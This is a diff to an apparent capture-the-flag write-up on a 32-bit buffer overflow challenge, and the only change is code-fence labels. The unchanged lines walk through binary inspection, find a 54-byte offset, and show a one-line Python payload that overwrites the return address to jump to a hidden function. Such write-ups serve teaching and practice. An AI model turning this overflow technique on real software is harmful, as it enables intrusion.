@@ -7,7 +7,7 @@ tags: buffer overflow, writeups, reversing
 The binary can be obtained from here: [buf0](/files/buf0.bin). Let's see
 what `file` command has to tell us about this challenge file:
 
-```shell
+```bash
 $ file buf0.bin
 buf0.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3a0cbf6e6af7d4a5d1294f2ce18e80ad3e778d48, not stripped
 ```
@@ -15,7 +15,7 @@ buf0.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically 
 So, this is an x86 ELF binary with symbols included. Let's run `strings`
 as well over this file:
 
-```shell
+```bash
 $ strings buf0.bin
 /lib/ld-linux.so.2
 j,O)
@@ -52,7 +52,7 @@ and as per the assumption, we need to leverage the overflow in a way
 that this function is called. Let's now run the binary and see how it
 behaves:
 
-```shell
+```bash
 $ ./buf0.bin
 AAAAAAAAAAA
 $
@@ -77,7 +77,7 @@ be 54B after which any extra byte would corrupt the stack metadata
 resulting in a `Segmentation fault (core dumped)` error. So, these 54B
 comprise of the following stack variables:
 
-```shell
+```bash
 50B (buf) + 4B (saved EBP)
 ```
 
@@ -102,7 +102,7 @@ From the IDA screenshot above it is already known that the `returnToMe`
 function is at location 0x08048404. Let's exploit the binary with a
 random payload of 54B concatenated with this new return address:
 
-```shell
+```bash
 $ python -c 'print "A"*54 + "\x04\x84\x04\x08"' | ./buf0.bin
 W00T!
 ```
